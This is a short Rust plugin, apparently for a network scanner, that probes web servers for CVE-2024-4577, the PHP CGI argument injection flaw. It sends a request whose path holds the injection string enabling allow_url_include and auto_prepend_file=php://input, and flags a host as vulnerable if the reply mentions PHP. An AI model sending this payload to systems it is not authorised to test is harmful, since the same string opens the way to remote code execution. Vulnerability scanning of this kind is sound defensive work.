/* http-vuln-cve2024-4577-4 - PHP CGI argument injection probe */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
let path = "/php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input";
    let resp = match http_request(ctx, "GET", path, None, "", "", None, 8192) {
        Some(r) if !r.is_empty() => r,
        _ => { set_out(ctx, "http-vuln-cve2024-4577-4: no HTTP response"); return 0; }
    };
    if contains_ci(&resp, "PHP") {
        set_out(ctx, &format!("VULNERABLE: {} [{}] (CVE-2024-4577)", path, http_status(&resp)));
    } else {
        set_out(ctx, &format!("not vulnerable: CVE-2024-4577 ({} [{}])", path, http_status(&resp)));
    }
    0
}
